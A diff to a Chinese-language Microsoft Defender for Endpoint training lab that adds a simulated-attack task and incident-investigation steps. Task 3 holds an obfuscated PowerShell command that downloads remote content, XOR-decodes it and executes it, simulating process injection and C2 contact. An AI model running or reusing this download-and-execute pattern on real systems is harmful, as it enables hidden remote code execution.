@@ -40,20 +40,6 @@ lab:
 
     >**注意：** 该窗口会在成功运行脚本后自动关闭，并在几分钟后，在 Microsoft Defender XDR 门户中生成警报。
 
-<!--- ### Task 2: Simulated Attacks
-
->**Note:** The Evaluation lab and the Tutorials & simulations section of the portal is no longer available. Please refer to the **[interactive lab simulation](https://mslabs.cloudguides.com/guides/SC-200%20Lab%20Simulation%20-%20Mitigate%20attacks%20with%20Microsoft%20Defender%20for%20Endpoint)** for a demonstration of the simulated attacks.
-
-1. From the left menu, under **Endpoints**, select **Evaluation & tutorials** and then select **Tutorials & simulations** from the left side.
-
-1. Select the **Tutorials** tab.
-
-1. Under *Automated investigation (backdoor)* you will see a message describing the scenario. Below this paragraph, click **Read the walkthrough**. A new browser tab opens which includes instructions to perform the simulation.
-
-1. In the new browser tab, locate the section named **Run the simulation** (page 5, starting at step 2) and follow the steps to run the attack. **Hint:** The simulation file *RS4_WinATP-Intro-Invoice.docm* can be found back in portal, just below the **Read the walkthrough** you selected in the previous step by selecting the **Get simulation file** button.
-
-    <!--- 1. Repeat the last 3 steps to run another tutorial, *Automated investigation (fileless attack)*. This is no longer working due to win1 AV --->
-
 ### 任务 2：调查警报和事件
 
 在此任务中，你将调查上一任务中载入检测测试脚本生成的警报和事件。
@@ -84,6 +70,46 @@ lab:
 
 1. 查看“攻击情景、警报、资产、调查、证据和响应”以及“摘要”选项卡的内容。 设备和用户位于“资产”选项卡下**。在实际事件中，“攻击情景”选项卡会显示“事件图”****。 提示：某些选项卡可能由于显示器的大小而被隐藏。 选择省略号选项卡 (...) 显示它们。
 
-<!---    >**Warning:** The simulated attacks here are an excellent source of learning through practice. Only perform the attacks in the instructions provided for this lab when using the course provided Azure tenant.  You may perform other simulated attacks *after* this training course is complete with this tenant. --->
+### 任务 3 模拟攻击
+
+>**警告：** 此模拟攻击非常适合实践式学习。 在使用 Azure 租户提供的课程时，请仅执行为本实验室提供的说明中的攻击。  在此租户完成此培训课程后，可以执行其他模拟攻击。**
+
+在此任务中，你将模拟 WIN1 虚拟机上的攻击，并验证 Microsoft Defender for Endpoint 是否检测到并缓解了攻击。
+
+1. 在 WIN1 虚拟机上，右键单击“开始”按钮，然后选择“Windows PowerShell (管理员)”**********。
+
+1. 显示“用户帐户控制”窗口时，选择“是”以允许应用运行。
+
+1. 复制以下模拟脚本并将其粘贴到 PowerShell 窗口中，然后按 Enter 来运行该脚本****：
+
+    ```PowerShell
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+    ;$xor = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');
+    $base64String = (Invoke-WebRequest -URI "https://wcdstaticfilesprdeus.blob.core.windows.net/wcdstaticfiles/MTP_Fileless_Recon.txt" -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
+    $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
+    $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
+    ```
+
+    >**注意：** 如果在运行脚本时遇到错误（红色），则可以打开记事本应用并将脚本复制到空白文件中。 确保在记事本中启用了“自动换行”**。 在 PowerShell 中单独复制并运行脚本的每一行。
+
+1. 该脚本将生成多行输出，并生成一条消息，指出“无法解析域中的域控制器”**。 几秒钟后，“记事本”应用将打开**。 模拟攻击代码将注入记事本中。 保持自动生成的记事本实例处于打开状态，以体验完整场景。 模拟攻击代码将尝试与外部 IP 地址通信（模拟 C2 服务器）。
+
+### 任务 4：以单个事件的形式调查模拟攻击
+
+1. 在 Microsoft Defender XDR 门户中，从左侧菜单栏选择“事件和警报”，然后选择“事件”********
+
+1. 一个名为“涉及一个终结点上的防御规避和发现的多阶段事件”的新事件位于右侧窗格中**。 选择事件名称以加载其详细信息。
+
+1. 在“攻击案例”选项卡下，折叠“警报”和“事件详细信息”窗格以查看完整的“事件图”**************。
+
+1. 将鼠标悬停在“事件图节点”上并选择它，以查看“实体”******。
+
+1. 重新展开“警报”窗格（左侧），然后选择“播放攻击案例”和“运行”图标**********。 这会逐个警报地显示攻击时间线，并动态填充“事件图”**。
+
+1. 查看“攻击情景、警报、资产、调查、证据和响应”以及“摘要”选项卡的内容。 设备和用户位于“资产”选项卡下**。提示****：某些选项卡可能由于显示器的大小而被隐藏。 选择省略号选项卡 (...) 显示它们。
+
+1. 在“证据和响应”选项卡下，选择“IP 地址”，然后选择显示的“IP 地址”**********。 在弹出窗口中，查看 IP 地址详细信息，向下滚动并选择“打开 IP 地址页”按钮****。
+
+1. 查看“IP 地址”页中“概述”、“事件和警报”以及“组织中的发现结果”选项卡的内容****。 某些选项卡可能不包含 IP 地址的信息。
 
 ## 你已完成本实验室
